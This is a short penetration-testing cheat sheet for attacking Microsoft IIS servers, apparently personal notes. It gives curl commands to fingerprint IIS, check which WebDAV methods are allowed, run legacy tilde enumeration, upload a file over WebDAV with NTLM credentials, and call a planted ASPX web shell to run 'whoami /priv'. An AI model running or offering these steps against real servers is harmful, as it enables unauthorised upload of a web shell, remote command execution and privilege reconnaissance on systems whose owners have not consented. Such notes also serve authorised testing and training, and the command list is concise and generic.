

IIS, WebDAV, tilde enumeration.

IIS fingerprint:

```bash
curl -sI http://TARGET
```

```text
Server: Microsoft-IIS
X-Powered-By: ASP.NET
```

WebDAV check:

```bash
curl -sI -X OPTIONS http://TARGET/webdav/
```

Look for:

```text
DAV
MS-Author-Via
PUT
DELETE
PROPFIND
```

IIS tilde enumeration (legacy — patched on IIS 8.0+, still hits old boxes):

```bash
curl -s -o /dev/null -w '%{http_code}\n' --path-as-is TARGET
```

```text
-o /dev/null   → Discard body
-w             → Display selected output
--path-as-is   → Preserve URL path
```

WebDAV file upload:

```bash
curl --ntlm -u USER:PASS -X PUT --data-binary @FILE TARGET/webdav/FILE
```

```text
--ntlm          → NTLM auth
-u              → Username/password
-X PUT          → PUT request
--data-binary   → Send file data
```

ASPX web shell:

```bash
curl -G TARGET/webdav/cmd.aspx --data-urlencode "cmd=whoami"
```

```text
whoami /priv
```
